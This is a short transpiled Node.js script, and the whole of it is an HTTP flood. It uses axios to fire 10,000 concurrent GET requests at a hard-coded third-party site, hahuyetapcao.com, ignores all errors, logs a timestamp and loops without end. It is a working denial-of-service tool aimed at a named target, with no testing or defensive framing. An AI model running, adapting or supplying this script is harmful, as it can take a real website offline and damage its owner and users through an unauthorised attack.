"use strict";

var _axios = require("axios");

var _axios2 = _interopRequireDefault(_axios);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _asyncToGenerator(fn) { return function () { var gen = fn.apply(this, arguments); return new Promise(function (resolve, reject) { function step(key, arg) { try { var info = gen[key](arg); var value = info.value; } catch (error) { reject(error); return; } if (info.done) { resolve(value); } else { return Promise.resolve(value).then(function (value) { step("next", value); }, function (err) { step("throw", err); }); } } return step("next"); }); }; }

const axios = _axios2.default.create({ timeout: 300 });
const _ = console.log;
const threshold = 10000;
const site = "http://hahuyetapcao.com/";

const call = (() => {
  var _ref = _asyncToGenerator(function* () {
    try {
      yield axios.get(site);
    } catch (err) {}
  });

  return function call() {
    return _ref.apply(this, arguments);
  };
})();

const loop = (() => {
  var _ref2 = _asyncToGenerator(function* () {
    const list = new Array(threshold).fill(null);
    yield Promise.all(list.map(function () {
      return call();
    }));
    _("[re-loop] at", new Date().toString());
    yield loop();
  });

  return function loop() {
    return _ref2.apply(this, arguments);
  };
})();

_asyncToGenerator(function* () {
  yield loop();
})();